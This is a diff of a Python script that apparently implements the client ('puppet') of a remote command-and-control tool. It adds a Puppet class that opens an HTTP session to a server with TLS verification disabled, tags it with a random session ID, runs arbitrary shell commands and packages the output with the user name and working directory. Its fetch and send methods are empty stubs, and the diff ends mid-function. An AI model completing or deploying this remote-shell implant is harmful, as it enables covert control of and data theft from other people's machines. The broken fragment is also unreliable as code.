@@ -3,6 +3,7 @@ import os
 import sys
 from datetime import datetime
 from subprocess import getoutput as execute
+from uuid import uuid4
 
 from requests import Session
 from urllib3 import disable_warnings
@@ -33,29 +34,47 @@ def get_arguments():
     return options
 
 
-def execute_command(command, current_work_dir=None):
-    try:
-        command_as_array = command.split(' ')
-        if 'cd' == command_as_array[0] and len(command_as_array) == 2:
-            os.chdir(command_as_array[1])
-            result = ''
-        else:
-            if current_work_dir:
-                os.chdir(current_work_dir)
-            result = execute(command)
-    except Exception as e:
-        result = str(e)
-    encoding = sys.getdefaultencoding()
-    user = os.getlogin()
-    current_work_dir = os.getcwd()
-    if isinstance(result, bytes):
-        result = result.decode(encoding, 'ignore')
-    return {
-        "user": user,
-        "pwd": current_work_dir,
-        "system_encoding": encoding,
-        "data": result
-    }
+class Puppet:
+    def __init__(self, server_base_url: str):
+        self.session = Session()
+        self.session.verify = False
+        self.session.headers['Session-ID'] = f"{uuid4()}"
+
+        self.server_base_url = server_base_url
+
+        self.work_dir = os.getcwd()
+        self.user = os.getlogin()
+        self.system_encoding = sys.getdefaultencoding()
+
+    def get_command(self):
+        pass
+
+    def execute_command(self, task_type, command):
+        os.chdir(self.work_dir)
+        try:
+            command_as_array = command.split(' ')
+            if 'cd' == command_as_array[0] and len(command_as_array) == 2:
+                self.work_dir = command_as_array[1]
+                os.chdir(self.work_dir)
+                result = ''
+            else:
+                result = execute(command)
+        except Exception as e:
+            result = str(e)
+        if isinstance(result, bytes):
+            result = result.decode(self.system_encoding, 'ignore')
+        return {
+            "user": self.user,
+            "pwd": self.work_dir,
+            "system_encoding": self.system_encoding,
+            "data": result
+        }
+
+    def send_results(self, puppet_message: dict):
+        pass
+
+
+def get_command(server_base_url):
 
 
 def communicate(event):
